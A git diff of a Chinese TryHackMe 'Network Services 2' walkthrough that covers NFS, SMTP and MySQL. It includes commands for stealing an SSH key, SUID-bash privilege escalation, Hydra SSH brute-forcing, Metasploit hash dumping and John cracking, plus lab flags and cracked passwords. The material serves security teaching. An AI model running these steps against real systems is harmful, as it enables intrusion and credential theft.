@@ -22,8 +22,6 @@ layout:
 
 TryHackMe实验房间链接：[https://tryhackme.com/room/networkservices2](https://tryhackme.com/room/networkservices2)
 
-
-
 ## NFS服务简介
 
 **什么是 NFS？**
@@ -34,7 +32,7 @@ NFS代表“Network File System-网络文件系统”，它允许系统通过网
 
 我们不需要详细地了解技术原理就能够有效地利用 NFS，但是如果你对NFS的技术原理感兴趣，可以访问以下文档链接进行了解：
 
-https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html
+[https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html](https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html)
 
 NFS工作过程：
 
@@ -59,13 +57,15 @@ NFS工作过程：
 
 以下资源能够更详细地解释 NFS 的技术实现和工作原理：
 
-* https://www.datto.com/library/what-is-nfs-file-share
-* http://nfs.sourceforge.net/
-* https://wiki.archlinux.org/index.php/NFS
+* [https://www.datto.com/library/what-is-nfs-file-share](https://www.datto.com/library/what-is-nfs-file-share)
+* [http://nfs.sourceforge.net/](http://nfs.sourceforge.net/)
+* [https://wiki.archlinux.org/index.php/NFS](https://wiki.archlinux.org/index.php/NFS)
 
-**答题**
+### **答题**
 
-![image-20230317194723712](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317194723712.png)
+阅读本小节内容，并回答以下问题。
+
+
 
 ## 枚举NFS信息
 
@@ -73,7 +73,7 @@ NFS工作过程：
 
 枚举可以被定义为“与目标主机建立主动连接以发现目标系统中潜在的攻击向量，并可将发现的信息用于对目标系统的进一步渗透的过程”，枚举是一个非常重要的阶段，因为通过枚举获得的关键信息将有助于我们开展后面的渗透工作。
 
-关于信息枚举的参考文章（很有价值）：https://resources.infosecinstitute.com/topic/what-is-enumeration/
+关于信息枚举的参考文章：[https://resources.infosecinstitute.com/topic/what-is-enumeration/](https://resources.infosecinstitute.com/topic/what-is-enumeration/)
 
 **NFS-Common**
 
@@ -81,7 +81,9 @@ NFS工作过程：
 
 在任何使用 NFS 的机器上安装这个包都很重要 ，无论是作为NFS客户端还是NFS服务器，它包括以下程序： lockd、statd\*\*、**showmount**、\*\*nfsstat、 gssd、 idmapd和mount.nfs。首先，我们需要关注“showmount”和 “mount.nfs”这两个程序，因为它们有助于我们从 NFS 共享中提取信息。
 
-如果你想了解有关此软件包的更多信息，请阅读以下链接页面：https://packages.ubuntu.com/jammy/nfs-common
+如果你想了解有关此软件包的更多信息，请阅读以下链接页面：
+
+[https://packages.ubuntu.com/jammy/nfs-common](https://packages.ubuntu.com/jammy/nfs-common)
 
 你可以使用“ sudo apt install nfs-common”命令来安装nfs-common，它是大多数Linux发行版的默认存储库的一部分。
 
@@ -105,21 +107,31 @@ NFS工作过程：
 * IP:share NFS 服务器的 IP 地址，以及我们希望挂载的共享名称
 * \-nolock 不使用 NLM 锁定
 
-**答题**
+### **答题**
+
+阅读本小节内容，并回答以下问题。
 
 tips：在本文相关的Tryhackme实验房间页面 部署目标靶机。
 
 进行端口扫描：`nmap -A -p- -T4 10.10.20.187`
 
-![image-20230317213827410](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317213827410.png)
 
-![image-20230317213806874](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317213806874.png)
+
+
+
+
+
+
+
+
 
 > 目标机开放了 7 个端口；NFS服务对应的端口号为 2049 。
 
 列出NFS共享：`/usr/sbin/showmount -e 10.10.20.187`
 
-![image-20230317204457108](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317204457108.png)
+
+
+
 
 > 找到的NFS共享名称为：/home
 
@@ -136,7 +148,9 @@ cd .ssh
 ls
 ```
 
-![image-20230317205136127](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317205136127.png)
+
+
+
 
 > NFS共享中的文件夹名称为：cappucino
 >
@@ -155,13 +169,21 @@ chmod 600 id_rsa
 ssh -i id_rsa cappucino@10.10.20.187
 ```
 
-![image-20230317205343119](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317205343119.png)
 
-![image-20230317205442086](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317205442086.png)
+
+
+
+
 
 > 成功通过SSH登录到目标机器
 
-![image-20230317205720915](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317205720915.png)
+
+
+
+
+
+
+
 
 ## 利用NFS服务
 
@@ -185,7 +207,7 @@ ssh -i id_rsa cappucino@10.10.20.187
 
 由于兼容性问题，我们将使用标准的 Ubuntu Server 18.04 bash 可执行文件，这与目标服务器所使用的bash相同，相关文件的链接如下：
 
-https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
+[https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash](https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash)
 
 我们可以通过命令行下载bash文件，注意我们需要的是原始脚本文件，请不要下载成 github 页面，我们将在攻击机上使用以下命令：
 
@@ -199,7 +221,9 @@ wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkt
 
 NFS Access -> Gain Low Privilege Shell -> Upload Bash Executable to the NFS share -> Set SUID Permissions Through NFS Due To Misconfigured Root Squash -> Login through SSH -> Execute SUID Bit Bash Executable -> ROOT ACCESS
 
-**答题**
+### **答题**
+
+阅读本小节内容，并回答以下问题。
 
 tips：基于上一小节的实验环境进一步操作。
 
@@ -219,9 +243,13 @@ ls -la
 ./bash -p
 ```
 
-![image-20230317223629633](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317223629633.png)
 
-![image-20230317223800902](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317223800902.png)
+
+
+
+
+
+
 
 > 我们使用什么字母配合chmod命令来设置SUID 位：s
 >
@@ -229,11 +257,21 @@ ls -la
 
 使用root shell查看目标文本文件内容：
 
-![image-20230317223829520](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317223829520.png)
+
+
+
+
+
 
 > root.txt内容为：THM{nfs\_got\_pwned} 。
 
-![image-20230317224231235](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317224231235.png)
+
+
+
+
+
+
+
 
 ## SMTP服务简介
 
@@ -261,7 +299,9 @@ POP（邮局协议-Post Office Protocol）和 IMAP（因特网消息访问协议
 
 我们可以将电子邮件从你的本地计算机到收件人的旅程映射如下：
 
-![image-20230317000333197](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317000333197.png)
+
+
+
 
 1. 邮件用户代理，它可以是你的电子邮件客户端或者其他外部程序，它会连接到你的域中的SMTP服务器，例如 smtp.google.com，这将启动 SMTP 握手，此连接通过 SMTP 端口（通常为25号端口）进行工作，一旦建立并验证了这些连接，SMTP 会话就会启动。
 2. 现在可以开始发送邮件了，客户端首先会将 发件人和收件人的电子邮件地址以及电子邮件正文和其他任何附件 一同提交给服务器。
@@ -272,7 +312,7 @@ POP（邮局协议-Post Office Protocol）和 IMAP（因特网消息访问协议
 
 这是一个非常简化的流程版本，还有很多子协议、通信和细节没有包括在内。如果你想了解有关电子邮件的更多信息，那么可以阅读以下链接内容：
 
-https://computer.howstuffworks.com/e-mail-messaging/email3.htm
+[https://computer.howstuffworks.com/e-mail-messaging/email3.htm](https://computer.howstuffworks.com/e-mail-messaging/email3.htm)
 
 **SMTP由什么运行？**
 
@@ -280,11 +320,15 @@ https://computer.howstuffworks.com/e-mail-messaging/email3.htm
 
 **更多信息：**
 
-以下链接相关内容更详细地解释了SMTP 的技术实现和工作原理，请根据学习需要进行访问：https://www.afternerd.com/blog/smtp/
+以下链接相关内容更详细地解释了SMTP 的技术实现和工作原理，请根据需要访问：
 
-**答题**
+[https://www.afternerd.com/blog/smtp/](https://www.afternerd.com/blog/smtp/)
 
-![image-20230317232141404](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317232141404.png)
+### **答题**
+
+阅读本小节内容，并回答以下问题。
+
+
 
 ## 枚举SMTP信息
 
@@ -304,11 +348,15 @@ tips：
 
 若目标服务器未禁用某些特殊SMTP命令，则可以利用这些特殊SMTP命令枚举用户，主要是MAIL FROM、RCPT TO、ETRN、VRFY指令。
 
-![image-20230318110656120](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318110656120.png)
+
+
+
 
 执行上面的SMTP命令，通过相应的返回码状态可以判断用户是否存在，主要是250状态和550状态。
 
-![image-20230318110722225](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318110722225.png)
+
+
+
 
 手动枚举用户名
 
@@ -362,7 +410,7 @@ tips：
 
 smtp-user-enum是kali自带的、使用Perl编写的工具，其原理是通过SMTP命令枚举用户账户。
 
-关于smtp-user-enum工具的参考文档：https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum
+关于smtp-user-enum工具的参考文档：[https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum](https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum)
 
 工具参数介绍
 
@@ -460,13 +508,17 @@ Target domain ............
 
 **SMTP返回码**
 
-![image-20230318112423985](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20230318112423985.png)
+
+
+
 
 **参考**
 
-SMTP用户枚举原理简介及相关工具：https://www.freebuf.com/articles/web/182746.html
+SMTP用户枚举原理简介及相关工具：[https://www.freebuf.com/articles/web/182746.html](https://www.freebuf.com/articles/web/182746.html)
 
-**答题**
+### **答题**
+
+阅读本小节内容，并回答以下问题。
 
 tips：在本文相关的Tryhackme实验房间页面 部署目标靶机。
 
@@ -476,11 +528,15 @@ tips：在本文相关的Tryhackme实验房间页面 部署目标靶机。
 nmap -A -p- -T4 10.10.181.4
 ```
 
-![image-20230318170100685](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318170100685.png)
+
+
+
 
 > 目标ip开放了两个端口，一个是22/SSH服务，一个是25/SMTP服务
 
-![image-20230318114942232](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318114942232.png)
+
+
+
 
 启动msf --> 搜索smtp版本检测模块 --> 选择该模块并列出模块相关的参数选项 --> 完成参数设置并最终执行该模块。
 
@@ -493,9 +549,11 @@ set RHOSTS 10.10.181.4     #此处ip为目标机ip
 run                        #执行该msf模块
 ```
 
-![image-20230318163727152](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318163727152.png)
 
-![image-20230318163933552](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318163933552.png)
+
+
+
+
 
 > 要使用的完整模块名称是：auxiliary/scanner/smtp/smtp\_version
 >
@@ -503,11 +561,19 @@ run                        #执行该msf模块
 >
 > 目标机器使用的邮件传输代理是： Postfix
 
-![image-20230318115054996](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318115054996.png)
+
+
+
 
 关于邮件传输代理：
 
-![image-20230317234301486](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230317234301486.png)
+
+
+
+
+
+
+
 
 继续使用msf搜索SMTP用户枚举模块，然后选择使用该模块、查看模块选项、设置模块参数，最后执行该模块：
 
@@ -521,15 +587,25 @@ set RHOSTS 10.10.181.4  #此处ip为目标机器ip
 run
 ```
 
-![image-20230318164215962](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318164215962.png)
 
-![image-20230318164243335](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318164243335.png)
+
+
+
+
 
 > 要使用的完整模块名称是：auxiliary/scanner/smtp/smtp\_enum
 >
 > 最终找到一个用户，用户名称为：administrator
 
-![image-20230318115344624](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318115344624.png)
+
+
+
+
+
+
+
+
+##
 
 ## 利用SMTP服务
 
@@ -561,7 +637,9 @@ Hydra工具在使用时有广泛的可定制性，它允许针对许多不同服
 * \[machine IP] 目标机器的IP地址
 * ssh / protocol 设置要进行暴力破解的相关协议
 
-**答题**
+### **答题**
+
+阅读本小节内容，并回答以下问题。
 
 tips：基于上一小节的实验环境进一步操作。
 
@@ -571,9 +649,11 @@ tips：基于上一小节的实验环境进一步操作。
 hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.181.4 ssh
 ```
 
-![image-20230318164439933](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318164439933.png)
 
-![image-20230318164534522](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318164534522.png)
+
+
+
+
 
 > administrator用户的ssh登录密码为：alejandro
 
@@ -586,11 +666,17 @@ ls
 cat smtp.txt
 ```
 
-![image-20230318164659543](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318164659543.png)
+
+
+
+
+
 
 > 目标文本文件的内容为：THM{who\_knew\_email\_servers\_were\_c00l?} 。
 
-![image-20230318115933330](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318115933330.png)
+
+
+
 
 ## MySQL服务简介
 
@@ -601,7 +687,7 @@ cat smtp.txt
 * SQL-Structured Query Language
 * RDBMS-relational database management system
 
-\*\*数据库(database) \*\*
+**数据库(database)**&#x20;
 
 数据库只是一个持久的、有组织的结构化数据集合。
 
@@ -633,13 +719,15 @@ MySQL可以运行在各种平台上，无论是Linux还是windows，它通常可
 
 以下学习资源更详细地解释了 MySQL 的技术实现和工作：
 
-https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE\_SQL\_EXECUTION.html
+[https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE\_SQL\_EXECUTION.html](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE\_SQL\_EXECUTION.html)
 
-https://www.w3schools.com/php/php\_mysql\_intro.asp
+[https://www.w3schools.com/php/php\_mysql\_intro.asp](https://www.w3schools.com/php/php\_mysql\_intro.asp)
 
-**答题**
+### **答题**
 
-![image-20230318000034348](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318000034348.png)
+阅读本小节内容，并回答以下问题。
+
+
 
 ## 枚举MySQL信息
 
@@ -659,10 +747,12 @@ https://www.w3schools.com/php/php\_mysql\_intro.asp
 
 我们使用 Metasploit 进行的枚举操作 也可以通过手动完成或者通过使用其他非 Metasploit 工具完成（例如使用 nmap 的 mysql-enum 脚本）。
 
-* https://nmap.org/nsedoc/scripts/mysql-enum.html
-* https://www.exploit-db.com/exploits/23081
+* [https://nmap.org/nsedoc/scripts/mysql-enum.html](https://nmap.org/nsedoc/scripts/mysql-enum.html)
+* [https://www.exploit-db.com/exploits/23081](https://www.exploit-db.com/exploits/23081)
 
-**答题**
+### **答题**
+
+阅读本小节内容，并回答以下问题。
 
 tips：在本文相关的Tryhackme实验房间页面 部署目标靶机。
 
@@ -672,7 +762,7 @@ tips：在本文相关的Tryhackme实验房间页面 部署目标靶机。
 sudo apt install default-mysql-client
 ```
 
-![image-20230318170717498](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318170717498.png)
+
 
 验证已提供的登录凭据（root：password）是否可连接到目标的MySQL数据库服务：
 
@@ -682,7 +772,9 @@ mysql -h 10.10.63.194 -u root -p
 #输入密码：password
 ```
 
-![image-20230318171107085](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318171107085.png)
+
+
+
 
 针对目标机进行端口扫描：
 
@@ -690,7 +782,9 @@ mysql -h 10.10.63.194 -u root -p
 nmap -A -p- -T4 10.10.63.194
 ```
 
-![image-20230318173157060](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318173157060.png)
+
+
+
 
 > 扫描到目标机开放了两个端口：22/ssh、3306/mysql
 
@@ -707,9 +801,13 @@ set USERNAME root
 run
 ```
 
-![image-20230318171240395](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318171240395.png)
 
-![image-20230318171530544](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318171530544.png)
+
+
+
+
+
+
 
 > 查询语句 select version() 的返回结果为：5.7.29-0ubuntu0.18.04.1
 
@@ -721,11 +819,25 @@ set SQL show databases
 run
 ```
 
-![image-20230318171841525](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318171841525.png)
+
+
+
+
+
+
+
 
 > 目标MySQL服务器中共有四个数据库
 
-![image-20230318161928709](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318161928709.png)
+
+
+
+
+
+
+
+
+
 
 ## 利用MySQL服务
 
@@ -755,7 +867,9 @@ run
 
 在本小节的示例中，我们要从数据库中提取密码哈希形式的数据，密码哈希是一种存储密码的方式--以非明文格式存储密码。
 
-**答题**
+### **答题**
+
+阅读本小节内容，并回答以下问题。
 
 tips：基于上一小节的实验环境进一步操作。
 
@@ -771,11 +885,15 @@ set USERNAME root
 run
 ```
 
-![image-20230318172417960](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318172417960.png)
 
-![image-20230318172529303](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318172529303.png)
 
-![image-20230318172735807](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318172735807.png)
+
+
+
+
+
+
+
 
 > 此处所选择的模块的完整名称为：auxiliary/scanner/mysql/mysql\_schemadump
 >
@@ -793,21 +911,33 @@ set USERNAME root
 run
 ```
 
-![image-20230318173503606](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318173503606.png)
+
+
+
+
+
+
+
+
+
 
 > 此处选择的模块的完整名称为：auxiliary/scanner/mysql/mysql\_hashdump
 >
 > 找到一个名为carl的用户，包含该用户及其密码hash值的完整字符串为：carl:\*EA031893AA21444B170FC2162A56978B8CEECE18
 
-退出msf，我们将上图中的最后一条记录保存到本地机新建的hash.txt文件中-- `echo carl:*EA031893AA21444B170FC2162A56978B8CEECE18 > hash.txt`
+退出msf，我们将上图中的最后一条记录保存到本地机新建的hash.txt文件中：`echo carl:*EA031893AA21444B170FC2162A56978B8CEECE18 > hash.txt`
 
-![image-20230318173756260](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318173756260.png)
+
+
+
 
 使用john进行hash破解（此处使用最简单的john语法即可）：`john hash.txt`
 
-![image-20230318173815153](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318173815153.png)
 
-> 破解hash值得到的密码为：doggie
+
+
+
+> 破解hash得到的密码为：doggie
 
 使用hash破解得到的登录凭据，通过SSH登陆目标机，查看目标文本文件的内容：
 
@@ -818,15 +948,19 @@ ls
 cat MySQL.txt
 ```
 
-![image-20230318173957515](https://c/Users/Vimalano2ise/AppData/Roaming/Typora/typora-user-images/image-20230318173957515.png)
+
 
 > 目标文本文件的内容为：THM{congratulations\_you\_got\_the\_mySQL\_flag} 。
 
-![image-20230318162157958](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230318162157958.png)
+
+
+
+
+
 
 ## 知识拓展
 
 请访问以下参考链接（外网）：
 
-* https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-exploits.html
-* https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
+* [https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-exploits.html](https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-exploits.html)
+* [https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/](https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/)
